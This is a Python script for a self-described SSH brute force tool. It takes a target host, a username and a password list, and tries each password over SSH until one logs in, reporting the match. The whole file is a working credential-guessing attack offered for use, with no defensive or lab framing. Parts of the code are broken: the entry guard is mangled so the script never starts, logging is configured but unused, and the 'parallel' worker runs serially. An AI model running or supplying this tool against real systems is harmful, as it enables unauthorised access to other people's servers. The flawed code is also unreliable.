import time
import paramiko
import signal
import sys
import multiprocessing
import random
import string
import logging

# Color codes for printing messages
RED = '\033[91m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'

# Event to signal stop of brute force attack
STOP_EVENT = multiprocessing.Event()

def print_banner():
    """Prints the banner for the SSH Brute Force Tool."""
    print(RED + "**************************************" + RED)
    print(WARNING + "*         SSH Brute Force Tool        *" + WARNING)
    print(RED + "**************************************" + RED)

def ssh_brute_force(host, username, password):
    """Attempts SSH connection using provided credentials."""
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(host, username=username, password=password, timeout=5)
        ssh_client.close()
        print(OKGREEN + f'[+] Connected with password {password}' + OKGREEN)
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False

def generate_passwords(password_list_path, min_length=6, max_length=10):
    """Generates passwords from a given password list file."""
    with open(password_list_path, "r") as password_list:
        passwords = [password.strip() for password in password_list if min_length <= len(password) <= max_length]
    return passwords

def generate_random_password(length=8):
    """Generates a random password of specified length."""
    characters = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(characters) for _ in range(length))

def brute_force_worker(host, username, passwords):
    """Worker function for parallel SSH brute force."""
    for password in passwords:
        if STOP_EVENT.is_set():
            break
        if ssh_brute_force(host, username, password):
            STOP_EVENT.set()
            break

def signal_handler(signal, frame):
    """Handler for Ctrl+C signal."""
    print("\nBrute force attack interrupted by user.")
    STOP_EVENT.set()
    sys.exit(0)

def main():
    """Main function to orchestrate the SSH brute force attack."""
    print_banner()
    print("\nInitializing brute force attack...\n")
    
    host = input("Enter the target Host IP: ")
    username = input("Enter the target Username: ")
    password_list_path = input("Enter the path to the password list file: ")
    
    # Configure logging
    logging.basicConfig(filename='brute_force.log', level=logging.INFO, format='%(asctime)s - %(message)s')
    logger = logging.getLogger()
    
    # Generating passwords
    passwords = generate_passwords(password_list_path)
    
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start the brute force attack
    brute_force_worker(host, username, passwords)

    print("\nBrute force attack completed.")

if name == "main":
    main()